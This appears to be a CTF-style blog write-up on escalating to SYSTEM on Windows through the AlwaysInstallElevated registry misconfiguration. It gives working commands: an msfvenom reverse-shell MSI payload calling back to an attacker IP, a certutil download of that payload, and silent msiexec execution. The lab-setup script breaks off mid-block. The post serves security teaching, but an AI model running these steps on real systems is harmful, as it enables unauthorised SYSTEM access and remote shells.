---
image: "/assets/img/posts/Always-Install-Elevated_0ac844c9e9.png"
title: "Alwaysinstallelevated"
description: "AlwaysInstallElevated is a Windows registry setting that affects the behavior of the Windows Installer service. The vulnerability occurs when the registry key"
pubDate: "2024-06-13"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).

## Configuration du Lab



To simulate this vulnerability in a lab environment, we will configure our system to be vulnerable to the AlwaysInstallElevated misconfiguration.



OS: Windows 10



To get started, I will first run the command Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser to authorize our user to execute scripts in the SYSTEM.



Next, we deactivate Windows Defender so as not to interrupt our learning.



We will Now, configure the necessary registry keys to make the system vulnerable. Use the PowerShell script below to configure AlwaysInstallElevated registry keys:



  `





```bash

$global:version = "1.0.0"



$ascii = @"



.____                        .__            .____          ___.     _________       __                

|    |    ____   ____ _____  |  |           |    |   _____ \_ |__  /   _____/ _____/  |_ __ ________  

|    |   /  _ \_/ ___\\__  \ |  |    ______ |    |   \__  \ | __ \ \_____  \_/ __ \   __\  |  \____ \ 

|    |__(   )  \___ / __ \|  |__ /_____/ |    |___ / __ \| \_\ \/        \  ___/|  | |  |  /  |_> >

|_______ \____/ \___  >____  /____/         |_______ (____  /___  /_______  /\___  >__| |____/|   __/ 

        \/          \/     \/                       \/    \/    \/        \/     \/           |__|    



~ Created with `

## Enumeration && Exploitation



Imagine that we have initial user access on a Windows target machine as shown here:

[![FootHold](https://i.ibb.co/jGXfy1w/1.png)](https://i.ibb.co/jGXfy1w/1.png)

To perform enumeration, I use two methods: manually via registry queries and automated using SharpUp.

### Manual Enumeration

To manually check if AlwaysInstallElevated registry keys are enabled, run these two commands:

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

> If both registry keys are enabled (value is `0x1`), users of any privilege level can install and execute `.msi` packages with elevated `NT AUTHORITY\SYSTEM` privileges.

[![Query](/assets/img/posts/3_c3fe614bfd.png)](https://i.ibb.co/6myrDw0/3.png)

### Automated Enumeration (SharpUp)

SharpUp is a tool that automates privilege escalation enumeration on Windows systems. You can download SharpUp from the resources section at the bottom of this writeup.

First, transfer SharpUp to the victim machine and run:

[![SharpUP.exe](/assets/img/posts/4_b4500b8f6b.png)](https://i.ibb.co/tBXd9Fs/4.png)

SharpUp can be run with auditing options to check for specific misconfigurations:

The first check audits the AlwaysInstallElevated misconfiguration:

[![vulnerable](/assets/img/posts/5_da5ae0951c.png)](https://i.ibb.co/wrCPxhv/5.png)

Here we confirm that both keys are set to `0x1`, indicating the target system is vulnerable.

## Vulnerability Exploitation

Once we confirm that the AlwaysInstallElevated registry keys are active, we can exploit this vulnerability to escalate privileges to SYSTEM:

1. **Generate a Malicious MSI Package**: Use `msfvenom` to create a reverse shell payload:

```bash
$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=1337 -f msi -o rev.msi
```

2. **Transfer the Payload to the Target Machine**:

```bash
C:\Users\MrR0807\Desktop>certutil -urlcache -f http://192.168.56.1/rev.msi rev.msi
```

3. **Execute MSI Installation with msiexec while listening on netcat**:







```bash

msiexec /quiet /qn /i file.msi

```

`



[![NT Authority](/assets/img/posts/6_7c2e11e2fe.png)](https://i.ibb.co/Ph8C0TX/6.png)



## Ressources supplementaires



Here are some additional resources that might be helpful to you:



[SharpUP](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)[Hacktricks WIndows hardening](https://book.hacktricks.xyz/v/fr/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Windows%20Privilege%20Escalation%20-%20AlwaysInstallElevated%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Falwaysinstallelevated%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Windows%20Privilege%20Escalation%20-%20AlwaysInstallElevated%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Falwaysinstallelevated%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Falwaysinstallelevated%2F&text=Windows%20Privilege%20Escalation%20-%20AlwaysInstallElevated%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Falwaysinstallelevated%2F)

